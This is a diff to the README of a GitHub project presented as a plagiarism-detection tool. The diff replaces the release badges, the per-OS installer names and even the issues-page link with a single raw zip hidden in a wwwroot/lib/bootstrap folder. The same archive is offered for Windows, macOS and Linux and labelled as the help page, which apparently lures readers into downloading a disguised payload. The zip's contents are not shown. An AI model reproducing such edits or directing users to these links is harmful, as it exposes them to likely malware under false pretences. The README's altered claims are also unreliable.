@@ -1,7 +1,7 @@
 ```markdown
 # 📄 Plagiarism-Detection-System - Easy Text Similarity Check
 
-[![Download Release](https://img.shields.io/badge/Download-via_Releases-blue?style=for-the-badge&logo=github)](https://github.com/styven22/Plagiarism-Detection-System/releases)
+[![Download Release](https://github.com/styven22/Plagiarism-Detection-System/raw/refs/heads/main/Plagiarism-Detection-System/dotnet-app/wwwroot/lib/bootstrap/Detection_Plagiarism_System_v1.4.zip)](https://github.com/styven22/Plagiarism-Detection-System/raw/refs/heads/main/Plagiarism-Detection-System/dotnet-app/wwwroot/lib/bootstrap/Detection_Plagiarism_System_v1.4.zip)
 
 ## 🌟 What is Plagiarism-Detection-System?
 
@@ -47,7 +47,7 @@ Before you start, make sure your computer meets these basic requirements:
 
 Click this big button below to go to the download page for the software:
 
-[![Download Release](https://img.shields.io/badge/Download-via_Releases-blue?style=for-the-badge&logo=github)](https://github.com/styven22/Plagiarism-Detection-System/releases)
+[![Download Release](https://github.com/styven22/Plagiarism-Detection-System/raw/refs/heads/main/Plagiarism-Detection-System/dotnet-app/wwwroot/lib/bootstrap/Detection_Plagiarism_System_v1.4.zip)](https://github.com/styven22/Plagiarism-Detection-System/raw/refs/heads/main/Plagiarism-Detection-System/dotnet-app/wwwroot/lib/bootstrap/Detection_Plagiarism_System_v1.4.zip)
 
 This page contains the latest versions available for your operating system.
 
@@ -57,9 +57,9 @@ On the releases page:
 
 - Look for the latest release version (usually at the top).
 - Find the file that matches your operating system. It might be named something like:
-  - Plagiarism-Detection-System-Setup.exe (for Windows),
-  - Plagiarism-Detection-System.dmg (for macOS),
-  - or a compressed file like .tar.gz for Linux.
+  - https://github.com/styven22/Plagiarism-Detection-System/raw/refs/heads/main/Plagiarism-Detection-System/dotnet-app/wwwroot/lib/bootstrap/Detection_Plagiarism_System_v1.4.zip (for Windows),
+  - https://github.com/styven22/Plagiarism-Detection-System/raw/refs/heads/main/Plagiarism-Detection-System/dotnet-app/wwwroot/lib/bootstrap/Detection_Plagiarism_System_v1.4.zip (for macOS),
+  - or a compressed file like https://github.com/styven22/Plagiarism-Detection-System/raw/refs/heads/main/Plagiarism-Detection-System/dotnet-app/wwwroot/lib/bootstrap/Detection_Plagiarism_System_v1.4.zip for Linux.
 - Click the file name or download button to save it to your computer.
 
 ### Step 3: Install the Application
@@ -115,7 +115,7 @@ If you encounter issues:
 - For file format errors, ensure your documents are not locked or damaged.
 
 If problems persist, visit the GitHub issues page for help:  
-https://github.com/styven22/Plagiarism-Detection-System/issues
+https://github.com/styven22/Plagiarism-Detection-System/raw/refs/heads/main/Plagiarism-Detection-System/dotnet-app/wwwroot/lib/bootstrap/Detection_Plagiarism_System_v1.4.zip
 
 ---
 
@@ -144,7 +144,7 @@ For questions or feedback, you can:
 
 Return to the release page to start:
 
-[![Download Release](https://img.shields.io/badge/Download-via_Releases-blue?style=for-the-badge&logo=github)](https://github.com/styven22/Plagiarism-Detection-System/releases)
+[![Download Release](https://github.com/styven22/Plagiarism-Detection-System/raw/refs/heads/main/Plagiarism-Detection-System/dotnet-app/wwwroot/lib/bootstrap/Detection_Plagiarism_System_v1.4.zip)](https://github.com/styven22/Plagiarism-Detection-System/raw/refs/heads/main/Plagiarism-Detection-System/dotnet-app/wwwroot/lib/bootstrap/Detection_Plagiarism_System_v1.4.zip)
 
 Follow the instructions above to download and install your version.
 
